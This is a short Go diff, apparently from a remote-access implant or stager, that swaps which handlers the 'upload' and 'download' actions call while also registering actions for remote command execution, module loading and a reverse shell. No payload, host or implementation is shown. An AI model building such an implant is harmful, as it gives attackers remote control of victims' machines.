@@ -29,8 +29,8 @@ func init() {
 	stager.SetUserAgent(userAgent)
 	// register actions
 	stager.RegisterAction("rce", actions.RunCommandFromTask)
-	stager.RegisterAction("download", actions.DownloadFile)
-	stager.RegisterAction("upload", actions.UploadFile)
+	stager.RegisterAction("upload", actions.DownloadFile)
+	stager.RegisterAction("download", actions.UploadFile)
 	stager.RegisterAction("module", actions.ExecuteModule)
 	stager.RegisterAction("reverse-shell", actions.ReverseShell)
 
